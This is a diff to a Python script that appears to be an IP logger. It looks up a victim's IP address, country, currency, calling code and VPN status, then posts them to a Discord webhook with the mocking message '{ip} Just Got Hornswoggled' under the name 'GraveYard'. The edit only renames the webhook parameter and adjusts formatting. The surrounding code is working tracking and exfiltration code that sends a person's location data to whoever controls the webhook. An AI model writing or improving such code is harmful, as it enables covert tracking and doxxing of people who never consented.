@@ -9,7 +9,7 @@ country     =    get(f'https://ipapi.co/{ip}/country_name').text
 callcode    =    get(f"https://ipapi.co/{ip}/country_calling_code").text
 vpn         =    get('http://ip-api.com/json?fields=proxy').text
 
-def 一(webhook:str):
+def 一(str):
     data = {
     "content" : f"""
     **__{ip} Just Got Hornswoggled__**
@@ -22,7 +22,7 @@ def 一(webhook:str):
     > <:rip:959916670946791474> # **Currency |  {currency}**
     > <:rip:959916670946791474> # **CallCode | {callcode}**
     > <:rip:959916670946791474> # **VPN | {json.loads(vpn)['proxy']}**  
-""",
+    """,
     "username" : 
     (
         "GraveYard / 👻"
@@ -32,4 +32,4 @@ def 一(webhook:str):
         "https://i.pinimg.com/236x/2e/a4/9b/2ea49b032782f8146c58ba2abaa7114b.jpg"
     )
     }
-    requests.post(webhook, json=data)
+    requests.post(str, json=data)
